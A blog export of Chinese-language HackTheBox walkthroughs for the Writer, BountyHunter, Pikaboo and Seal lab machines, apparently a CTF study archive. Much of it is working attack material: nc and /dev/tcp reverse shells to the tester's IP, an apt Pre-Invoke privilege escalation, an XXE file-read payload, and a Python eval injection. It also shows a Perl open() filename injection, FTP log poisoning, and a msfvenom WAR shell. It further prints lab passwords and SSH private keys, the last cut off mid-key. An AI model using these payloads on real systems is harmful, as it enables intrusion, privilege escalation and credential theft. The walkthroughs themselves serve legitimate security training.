KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAxqOWLbG36VBpFEz2ENaw0DfwMRLJdD3QpaIApp27SvktsWY3hOJzwC4+LHoqnJpIdi&#x2F;qLDnTx5v8vB67K04f+4FJl2fYVSwwMIrfc&#x2F;+CHxcTrrw+uIRVIiUuKFOznaG7QbqiFE1CsmnNAf7mz4Ci5VfkjwfZr18rduaUXBdNVIzPwNnL48wzF1QHgVnRTCB3i76pHSoZEA0bMDkUcqWuI0Z+3VOZlhGp0&#x2F;v2jr2JH&#x2F;uA6U0g4Ym8vqgwvEeTk1gNPIM6fg9xEYMUw+GhXQ5Q3CPPAVUaAfRDSivWtzNF1XcELH1ofF+ZY44vcQppovWgyOaw2fAHW6eaTIcfhw3ExT2VSh7qm39NITKkAHwoPQ7VJbTY0Uj87+j6RV7xQJZqOG0ASxd4Y1PvKiGhketFOd6a2m8cpJwsLFGQNtGA4kisG8m&#x2F;&#x2F;aQsZfllYPI4n4A1pXi&#x2F;7NA0E4cxNH+xt&#x2F;&#x2F;ZMRwssfahK65k6+Yc91qFWl5R3Zw9wUZl&#x2F;G10irJuYXUDAAAFiN5gLYDeYC2AAAAAB3NzaC1yc2EAAAGBAMajli2xt+lQaRRM9hDWsNA38DESyXQ90KWiAKadu0r5LbFmN4Tic8AuPix6KpyaSHYv6iw508eb&#x2F;LweuytOH&#x2F;uBSZdn2FUsMDCK33P&#x2F;gh8XE668PriEVSIlLihTs52hu0G6ohRNQrJpzQH+5s+AouVX5I8H2a9fK3bmlFwXTVSMz8DZy+PMMxdUB4FZ0Uwgd4u+qR0qGRANGzA5FHKlriNGft1TmZYRqdP79o69iR&#x2F;7gOlNIOGJvL6oMLxHk5NYDTyDOn4PcRGDFMPhoV0OUNwjzwFVGgH0Q0or1rczRdV3BCx9aHxfmWOOL3EKaaL1oMjmsNnwB1unmkyHH4cNxMU9lUoe6pt&#x2F;TSEypAB8KD0O1SW02NFI&#x2F;O&#x2F;o+kVe8UCWajhtAEsXeGNT7yohoZHrRTnemtpvHKScLCxRkDbRgOJIrBvJv&#x2F;2kLGX5ZWDyOJ+ANaV4v+zQNBOHMTR&#x2F;sbf&#x2F;2TEcLLH2oSuuZOvmHPdahVpeUd2cPcFGZfxtdIqybmF1AwAAAAMBAAEAAAGAZMExObg9SvDoe82VunDLerIE+T9IQ9fe70S&#x2F;A8RZ7et6S9NHMfYTNFXAX5sP5iMzwg8HvqsOSt9KULldwtd7zXyEsXGQ&#x2F;5LMVrL6KMJfZBm2eBkvzzQAYrNtODNMlhYk&#x2F;3AFKjsOK6USwYJj3Lio55+vZQVcW2Hwj&#x2F;zhH90J8msCLhXLH57CA4Ex1WCTkwOc35sz+IET+VpMgidRwd1b+LSXQPhYnRAUjlvtcfWdikVt2+itVvkgbayuG7JKnqA4IQTrgoJuC&#x2F;s4ZT4M8qh4SuN&#x2F;ANHGohCuNsOcb5xp&#x2F;E2WmZ3GcmbB0XE4BEhilAWLts4yexGrQ9So+eAXnfWZHRObhugy88TGy4v05B3z955EWDFnrJX0aMXnl6N71m&#x2F;g5XoYJ6hu5tazJtaHrZQsD5f71DCTLTSe1ZMwea6MnPisV8O7PC&#x2F;PFIBP+5mdPf3RXx0i7i5rLGdlTGJZUa+i&#x2F;vGObbURyd5EECiS&#x2F;Lpi0dnmUJKcgEKpf37xQgrFpTExAAAAwQDY6oeUVizwq7qNRqjtE8Cx2PvMDMYmCp4ub8UgG0JVsOVWenyikyYLaOqWr4gUxIXtCtA4BOWMkRaBBn+3YeqxRmOUo2iU4O3GQym3KnZsvqO8MoYeWtWuL+tnJNgDNQInzGZ4&#x2F;SFK23cynzsQBgb1V8u63gRX&#x2F;IyYCWxZOHYpQb+yqPQUyGcdBjpkU3JQbb2Rrb5rXWzUCzjQJmZs9F7wWV5O3OcDBcSQRCSrES3VxY+FUuODhPrrmAtgFKdkZGYAAADBAPSpB9WrW9cg0gta9CFhgTt&#x2F;IW75KE7eXIkVV&#x2F;NH9lI4At6X4dQTSUXBFhqhzZcHq4aXzGEq4ALvUPP9yP7p7S2BdgeQ7loiRBng6WrRlXazS++5NjI3rWL5cmHJ1H8VN6Z23+ee0O8x62IoYKdWqKWSCEGudvMK1rPd3Mgj5x1lrM7nXTEuMbJEAoX8+AAxQ6KcEABWZ1xmZeA4MLeQTBMeoB+1HYYm+13NK8iNqGBR7bjv2XmVY6tDJaMJ+iJGdQAAAMEAz9h&#x2F;44kuux7&#x2F;DiyeWV&#x2F;+MXy5vK2sJPmHQ87F9dTHwIzXQyx7xEZN7YHdBr7PHf7PYd4zNqW3GWL3reMjAtMYdir7hd1G6PjmtcJBA7Vikbn3mEwRCjFa5XcRP9VX8nhwVoRGuf8QmD0beSm8WUb8wKBVkmNoPZNGNJb0xvSmFEJ&#x2F;BwT0yAhKXBsBk18mx8roPS+wd9MTZ7XAUX6F2mZ9T12aIYQCajbzpd+fJ&#x2F;N64NhIxRh54fNwy7uLkQ0cIY6XAAAAC2pvaG5Ad3JpdGVyAQIDBAUGBw&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- 提权信息john在management组中，有权限写入apt相关配置目录，前面也看到apt uupdate定时运行： Linux for Pentester: APT Privilege Escalationhttps://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/ 可以写一个配置文件，使得apt update时执行我们的命令 提权 &amp; root flag添加一个Pre-Invoke，等待触发，root： 1echo 'apt::Update::Pre-Invoke &#123;\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.4 4444 &gt;/tmp/f\"&#125;;' &gt; /etc/apt/apt.conf.d/miao 参考资料 Linux for Pentester: APT Privilege Escalationhttps://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/ HTB Writer [Discussion] | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-Writer-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"BountyHunter - HackTheBox","slug":"BountyHunter-HackTheBox","date":"2021-07-27T06:54:21.000Z","updated":"2021-11-22T06:40:58.837Z","comments":true,"path":"2021/07/27/BountyHunter-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/07/27/BountyHunter-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/359 10.10.11.100 端口扫描22和80 12345678910111213141516171819$ nmap -sC -sV 10.10.11.100Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 13:46 CSTNmap scan report for 10.10.11.100Host is up (0.070s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)| 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)|_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Bounty HuntersService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 31.80 seconds 80 目录扫描目录扫描可以发现个db.php,这个后面会用到： 1234567891011gobuster dir -u http://10.10.11.100/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50 --wildcard/assets (Status: 301) [Size: 313] [--&gt; http://10.10.11.100/assets/]/css (Status: 301) [Size: 310] [--&gt; http://10.10.11.100/css/]/db.php (Status: 200) [Size: 0]/index.php (Status: 200) [Size: 25169]/index.php (Status: 200) [Size: 25169]/js (Status: 301) [Size: 309] [--&gt; http://10.10.11.100/js/]/portal.php (Status: 200) [Size: 125]/resources (Status: 301) [Size: 316] [--&gt; http://10.10.11.100/resources/]/server-status (Status: 403) [Size: 277] portalportal点进去是建设中，给出的链接点进去是提交漏洞界面： 测试提交，数据格式是base64编码的xml： resources调试器里可以发现相关js，并且resources目录可以直接访问，其中readme.txt得到提示信息： XXE因为提交的数据格式是xml，尝试进行xxe，脚本可以直接使用bountylog.js中的,xxe读文件： 所以可以直接去读取前面发现的db.php,得到密码: 12345678&lt;?php&#x2F;&#x2F; TODO -&gt; Implement login system with the database.$dbserver &#x3D; &quot;localhost&quot;;$dbname &#x3D; &quot;bounty&quot;;$dbusername &#x3D; &quot;admin&quot;;$dbpassword &#x3D; &quot;m19RoAU0hP41A1sTsq6K&quot;;$testuser &#x3D; &quot;test&quot;;?&gt; read.js12345678910111213var xml &#x3D; &#96;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;db.php&quot;&gt; ]&gt;&lt;bugreport&gt;&lt;title&gt;&amp;xxe;&lt;&#x2F;title&gt;&lt;cwe&gt;test&lt;&#x2F;cwe&gt;&lt;cvss&gt;9.8&lt;&#x2F;cvss&gt;&lt;reward&gt;100&lt;&#x2F;reward&gt;&lt;&#x2F;bugreport&gt;&#96;returnSecret(btoa(xml));&quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;tracker_diRbPr00f314.php&quot;&quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;db.php&quot; user flag读取/etc/passwd已经得到了用户名，其中development用户可以使用这个密码登录，得到user.txt: 提权信息sudo ticketValidator.py： 查看文件，就是读取md文件，检查一系列条件后执行eval,那么我们就可以构造满足前置条件的md文件，执行恶意python代码 ticketValidator.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#Skytrain Inc Ticket Validation System 0.1#Do not distribute this file.def load_file(loc): if loc.endswith(\".md\"): return open(loc, 'r') else: print(\"Wrong file type.\") exit()def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(\"# Skytrain Inc\"): return False continue if i == 1: if not x.startswith(\"## Ticket to \"): return False print(f\"Destination: &#123;' '.join(x.strip().split(' ')[3:])&#125;\") continue if x.startswith(\"__Ticket Code:__\"): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(\"**\"): return False ticketCode = x.replace(\"**\", \"\").split(\"+\")[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(\"**\", \"\")) if validationNumber &gt; 100: return True else: return False return Falsedef main(): fileName = input(\"Please enter the path to the ticket file.\\n\") ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(\"Valid ticket.\") else: print(\"Invalid ticket.\") ticket.closemain() 提权 &amp; root flag服务器上有nc，直接reverse shell： exp.md1234# Skytrain Inc ## Ticket to __Ticket Code:__**102 + 10 &#x3D;&#x3D; 112 and __import__(&#39;os&#39;).system(&#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.14.8 4444 &gt;&#x2F;tmp&#x2F;f&#39;) &#x3D;&#x3D; False 参考资料 HTB BountyHunter [Discussion] | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-BountyHunter-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Pikaboo - HackTheBox","slug":"Pikaboo-HackTheBox","date":"2021-07-20T07:09:18.000Z","updated":"2021-12-06T05:44:57.964Z","comments":true,"path":"2021/07/20/Pikaboo-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/07/20/Pikaboo-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/360 10.10.10.249 端口扫描21,22,80: 1234567891011121314151617181920$ nmap -sC -sV 10.10.10.249Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-20 14:00 CSTNmap scan report for 10.10.10.249Host is up (0.070s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:| 2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)| 256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)|_ 256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)80/tcp open http nginx 1.14.2|_http-server-header: nginx/1.14.2|_http-title: PikabooService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 30.47 seconds 80 目录扫描admin点进去，根据信息发现是81端口，nginx反代： nginx配置不当可以进行目录遍历： Path traversal via misconfigured NGINX alias - Vulnerabilities - Acunetixhttps://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/ 利用这个方式扫目录： 12345678gobuster dir -u http://10.10.10.249/admin../ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50/.htpasswd (Status: 403) [Size: 274]/.hta (Status: 403) [Size: 274]/.htaccess (Status: 403) [Size: 274]/admin (Status: 401) [Size: 456]/javascript (Status: 301) [Size: 314] [--&gt; http://127.0.0.1:81/javascript/]/server-status (Status: 200) [Size: 3897] admin_staging根据status里得到的信息，同样方式访问admin_staging： LFI根据页面参数格式，可能存在lfi,fuzz后发现可以包含几个日志文件： https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt LFI to RCE根据已有条件，搜到： FTP Log Poisoning Through LFI - Secnhackhttps://secnhack.in/ftp-log-poisoning-through-lfi/ ftp连接时注入php代码到日志中，web包含ftp日志，触发执行php代码： 123&lt;?php exec(&quot;&#x2F;bin&#x2F;bash -c &#39;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.6&#x2F;4444 0&gt;&amp;1&#39;&quot;); ?&gt;http:&#x2F;&#x2F;10.10.10.249&#x2F;admin..&#x2F;admin_staging&#x2F;index.php?page&#x3D;%2fvar%2flog%2fvsftpd%2elog user flagwww-data用户可以去读取pwnmeow用户目录user.txt: 信息ldap查看端口可以发现本地389，LDAP： config/opt/pokeapi/config/settings.py中可以得到ldap密码： 123456789101112DATABASES = &#123; \"ldap\": &#123; \"ENGINE\": \"ldapdb.backends.ldap\", \"NAME\": \"ldap:///\", \"USER\": \"cn=binduser,ou=users,dc=pikaboo,dc=htb\", \"PASSWORD\": \"J~42%W?PFHl]g\", &#125;, \"default\": &#123; \"ENGINE\": \"django.db.backends.sqlite3\", \"NAME\": \"/opt/pokeapi/db.sqlite3\", &#125;&#125; LDAP使用得到认证信息可以进行ldap查询，获取其他信息 1234567891011121314ldapsearch -D &quot;cn&#x3D;binduser,ou&#x3D;users,dc&#x3D;pikaboo,dc&#x3D;htb&quot; -w &#39;J~42%W?PFHl]g&#39; -b &#39;dc&#x3D;pikaboo,dc&#x3D;htb&#39; -LLL -h 127.0.0.1 -p 389 -s sub &quot;(objectClass&#x3D;*)&quot;dn: uid&#x3D;pwnmeow,ou&#x3D;users,dc&#x3D;ftp,dc&#x3D;pikaboo,dc&#x3D;htbobjectClass: inetOrgPersonobjectClass: posixAccountobjectClass: shadowAccountuid: pwnmeowcn: Pwnsn: MeowloginShell: &#x2F;bin&#x2F;bashuidNumber: 10000gidNumber: 10000homeDirectory: &#x2F;home&#x2F;pwnmeowuserPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw&#x3D;&#x3D; pwnmeowldap中得到pwnmeow用户密码，不能ssh，可以FTP： 12echo X0cwdFQ0X0M0dGNIXyczbV80bEwhXw== | base64 -d_G0tT4_C4tcH_'3m_4lL!_ 提权信息查看crontab可以发现root定期对ftp下的目录进行csvupdate： /usr/local/bin/csvupdate查看这个文件，发现是一个perl脚本，内部使用open打开csv文件，根据相关信息，搜到： security - perl open() injection prevention - Stack Overflowhttps://stackoverflow.com/questions/26614348/perl-open-injection-prevention 所以我们可以生成一个文件名是恶意代码的csv文件，使其执行 exploit &amp; root flag生成个恶意文件名的csv，ftp上传，等待执行，得到root shell： 123|python3 -c &#39;import os,pty,socket;s&#x3D;socket.socket();s.connect((\\&quot;10.10.14.6\\&quot;, 4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\&quot;sh\\&quot;)&#39;;echo .csvtouch &quot;|python3 -c &#39;import os,pty,socket;s&#x3D;socket.socket();s.connect((\\&quot;10.10.14.6\\&quot;, 4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\&quot;sh\\&quot;)&#39;;echo .csv&quot; 参考资料 Path traversal via misconfigured NGINX alias - Vulnerabilities - Acunetixhttps://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/ https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt FTP Log Poisoning Through LFI - Secnhackhttps://secnhack.in/ftp-log-poisoning-through-lfi/ security - perl open() injection prevention - Stack Overflowhttps://stackoverflow.com/questions/26614348/perl-open-injection-prevention Pikaboo Machine Discussion | RaidForumshttps://raidforums.com/Thread-Tutorial-Pikaboo-Machine-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Seal - HackTheBox","slug":"Seal-HackTheBox","date":"2021-07-13T06:33:28.000Z","updated":"2021-11-15T01:28:21.338Z","comments":true,"path":"2021/07/13/Seal-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/07/13/Seal-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/358 10.10.10.250 端口扫描22,443,8080: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110$ nmap -sC -sV 10.10.10.250Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-13 13:34 CSTNmap scan report for 10.10.10.250Host is up (0.081s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)| 256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)|_ 256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)443/tcp open ssl/http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Seal Market| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK| Not valid before: 2021-05-05T10:24:03|_Not valid after: 2022-05-05T10:24:03| tls-alpn:|_ http/1.1| tls-nextprotoneg:|_ http/1.18080/tcp open http-proxy| fingerprint-strings:| FourOhFourRequest:| HTTP/1.1 401 Unauthorized| Date: Tue, 13 Jul 2021 05:35:02 GMT| Set-Cookie: JSESSIONID=node0rkdj8cp2y9wi1qap4c6dmp4gq2.node0; Path=/; HttpOnly| Expires: Thu, 01 Jan 1970 00:00:00 GMT| Content-Type: text/html;charset=utf-8| Content-Length: 0| GetRequest:| HTTP/1.1 401 Unauthorized| Date: Tue, 13 Jul 2021 05:35:01 GMT| Set-Cookie: JSESSIONID=node01334e5hwd3wp2eygx227q9j2g0.node0; Path=/; HttpOnly| Expires: Thu, 01 Jan 1970 00:00:00 GMT| Content-Type: text/html;charset=utf-8| Content-Length: 0| HTTPOptions:| HTTP/1.1 200 OK| Date: Tue, 13 Jul 2021 05:35:01 GMT| Set-Cookie: JSESSIONID=node0i2ezw46rfo05o9o1sr10yxgn1.node0; Path=/; HttpOnly| Expires: Thu, 01 Jan 1970 00:00:00 GMT| Content-Type: text/html;charset=utf-8| Allow: GET,HEAD,POST,OPTIONS| Content-Length: 0| RPCCheck:| HTTP/1.1 400 Illegal character OTEXT=0x80| Content-Type: text/html;charset=iso-8859-1| Content-Length: 71| Connection: close| &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;| RTSPRequest:| HTTP/1.1 505 Unknown Version| Content-Type: text/html;charset=iso-8859-1| Content-Length: 58| Connection: close| &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;| Socks4:| HTTP/1.1 400 Illegal character CNTL=0x4| Content-Type: text/html;charset=iso-8859-1| Content-Length: 69| Connection: close| &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x4&lt;/pre&gt;| Socks5:| HTTP/1.1 400 Illegal character CNTL=0x5| Content-Type: text/html;charset=iso-8859-1| Content-Length: 69| Connection: close|_ &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x5&lt;/pre&gt;| http-auth:| HTTP/1.1 401 Unauthorized\\x0D|_ Server returned status 401 but no WWW-Authenticate header.|_http-title: Site doesn't have a title (text/html;charset=utf-8).1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8080-TCP:V=7.91%I=7%D=7/13%Time=60ED2605%P=x86_64-apple-darwin19.6.SF:0%r(GetRequest,F4,\"HTTP/1\\.1\\x20401\\x20Unauthorized\\r\\nDate:\\x20Tue,\\x2SF:013\\x20Jul\\x202021\\x2005:35:01\\x20GMT\\r\\nSet-Cookie:\\x20JSESSIONID=nodeSF:01334e5hwd3wp2eygx227q9j2g0\\.node0;\\x20Path=/;\\x20HttpOnly\\r\\nExpires:\\SF:x20Thu,\\x2001\\x20Jan\\x201970\\x2000:00:00\\x20GMT\\r\\nContent-Type:\\x20texSF:t/html;charset=utf-8\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(HTTPOptions,10SF:7,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Tue,\\x2013\\x20Jul\\x202021\\x2005:3SF:5:01\\x20GMT\\r\\nSet-Cookie:\\x20JSESSIONID=node0i2ezw46rfo05o9o1sr10yxgn1SF:\\.node0;\\x20Path=/;\\x20HttpOnly\\r\\nExpires:\\x20Thu,\\x2001\\x20Jan\\x20197SF:0\\x2000:00:00\\x20GMT\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nAllSF:ow:\\x20GET,HEAD,POST,OPTIONS\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSPReSF:quest,AD,\"HTTP/1\\.1\\x20505\\x20Unknown\\x20Version\\r\\nContent-Type:\\x20teSF:xt/html;charset=iso-8859-1\\r\\nContent-Length:\\x2058\\r\\nConnection:\\x20cSF:lose\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Message\\x20505&lt;/h1&gt;&lt;pre&gt;reason:\\x20Unknown\\x20VeSF:rsion&lt;/pre&gt;\")%r(FourOhFourRequest,F4,\"HTTP/1\\.1\\x20401\\x20Unauthorized\\SF:r\\nDate:\\x20Tue,\\x2013\\x20Jul\\x202021\\x2005:35:02\\x20GMT\\r\\nSet-Cookie:SF:\\x20JSESSIONID=node0rkdj8cp2y9wi1qap4c6dmp4gq2\\.node0;\\x20Path=/;\\x20HtSF:tpOnly\\r\\nExpires:\\x20Thu,\\x2001\\x20Jan\\x201970\\x2000:00:00\\x20GMT\\r\\nCSF:ontent-Type:\\x20text/html;charset=utf-8\\r\\nContent-Length:\\x200\\r\\n\\r\\nSF:\")%r(Socks5,C3,\"HTTP/1\\.1\\x20400\\x20Illegal\\x20character\\x20CNTL=0x5\\r\\SF:nContent-Type:\\x20text/html;charset=iso-8859-1\\r\\nContent-Length:\\x2069SF:\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Message\\x20400&lt;/h1&gt;&lt;pre&gt;reasSF:on:\\x20Illegal\\x20character\\x20CNTL=0x5&lt;/pre&gt;\")%r(Socks4,C3,\"HTTP/1\\.1\\SF:x20400\\x20Illegal\\x20character\\x20CNTL=0x4\\r\\nContent-Type:\\x20text/htmSF:l;charset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nConnection:\\x20close\\rSF:\\n\\r\\n&lt;h1&gt;Bad\\x20Message\\x20400&lt;/h1&gt;&lt;pre&gt;reason:\\x20Illegal\\x20characteSF:r\\x20CNTL=0x4&lt;/pre&gt;\")%r(RPCCheck,C7,\"HTTP/1\\.1\\x20400\\x20Illegal\\x20chaSF:racter\\x20OTEXT=0x80\\r\\nContent-Type:\\x20text/html;charset=iso-8859-1\\rSF:\\nContent-Length:\\x2071\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;h1&gt;Bad\\x20MessaSF:ge\\x20400&lt;/h1&gt;&lt;pre&gt;reason:\\x20Illegal\\x20character\\x20OTEXT=0x80&lt;/pre&gt;\"SF:);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 45.51 seconds 8080Gutbucket,注册登录,可以查看信息： 443seal market： gitbucketgirbucketli得到一些用户名： 123luisalexroot tomcat历史commit里可以找到tomcat密码： 123http:&#x2F;&#x2F;10.10.10.250:8080&#x2F;root&#x2F;seal_market&#x2F;blob&#x2F;ac210325afd2f6ae17cce84a8aa42805ce5fd010&#x2F;tomcat&#x2F;tomcat-users.xml&lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;42MrHBf*z8&#123;Z%&quot; roles&#x3D;&quot;manager-gui,admin-gui&quot;&#x2F;&gt; tomcattomcat默认路径，登录查看status正常，index会得到302，简单地绕过： Tomcat path traversal via reverse proxy mapping - Vulnerabilities - Acunetixhttps://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/ shell同样的绕过方式，上传webshell，访问得到reverse shell,可以直接使用burp添加规则自动bypass： 1msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f war -o shell.war luis查看进程可以发现root会定时以luis身份运行ansible,查看文件发现是备份服务，并且会copy软链接： get id rsa那么就可以软链接luis用户的一些文件或者目录，例如.ssh目录和777权限的uploads链接, 然后就能通过一系列操作，以tomcat的shell得到luis的id_rsa: 123456789ln -s /home/luis/.ssh/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploadsls /opt/backups/archives/ cp /opt/backups/archives/backup-2021-06:17:33.gz rsa.gzgzip -kd rsa.gz tar -xf rsacd dashboardcd uploadscd .ssh cat id_rsa id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAs3kISCeddKacCQhVcpTTVcLxM9q2iQKzi9hsnlEt0Z7kchZrSZsGDkID79g&#x2F;4XrnoKXm2ud0gmZxdVJUAQ33Kg3Nk6czDI0wevr&#x2F;YfBpCkXm5rsnfo5zjEuVGoMTJhNZ8iOu7sCDZZA6sX48OFtuF6zuUgFqzHrdHrR4+YFawgP8OgJ9NWkapmmtkkxcEbF4n1+v&#x2F;l+74kEmti7jTiTSQgPr&#x2F;ToTdvQtw12+YafVtEkB&#x2F;8ipEnAIoD&#x2F;B6JOOd4pPTNgX8RMPWH93mStrqblnMOWJto9YpLxhM43v9I6EUje8gp&#x2F;EcSrvHDBezEEMzZS+IbcP+hnw5eladuLmtdTSMPTCWkpI9hXHNU9njcD+TRR&#x2F;A90VHqdqLlaJkgC9zpRXB2096DVxFYdOLcjgeN3rcnCAEhQ75VsEHXE&#x2F;NHgO8zjD2o3cnAOzsMyQrqNXtPa+qHjVDch&#x2F;T1TjSlCWxAFHy&#x2F;OIPxBupE&#x2F;kbEoy1+dJHuR+gEp6yMlfqFyEVhUbDqyhAAAFgOAxrtXgMa7VAAAAB3NzaC1yc2EAAAGBALN5CEgnnXSmnAkIVXKU01XC8TPatokCs4vYbJ5RLdGe5HIWa0mbBg5CA+&#x2F;YP+F656Cl5trndIJmcXVSVAEN9yoNzZOnMwyNMHr6&#x2F;2HwaQpF5ua7J36Oc4xLlRqDEyYTWfIjru7Ag2WQOrF+PDhbbhes7lIBasx63R60ePmBWsID&#x2F;DoCfTVpGqZprZJMXBGxeJ9fr&#x2F;5fu+JBJrYu404k0kID6&#x2F;06E3b0LcNdvmGn1bRJAf&#x2F;IqRJwCKA&#x2F;weiTjneKT0zYF&#x2F;ETD1h&#x2F;d5kra6m5ZzDlibaPWKS8YTON7&#x2F;SOhFI3vIKfxHEq7xwwXsxBDM2UviG3D&#x2F;oZ8OXpWnbi5rXU0jD0wlpKSPYVxzVPZ43A&#x2F;k0UfwPdFR6nai5WiZIAvc6UVwdtPeg1cRWHTi3I4Hjd63JwgBIUO+VbBB1xPzR4DvM4w9qN3J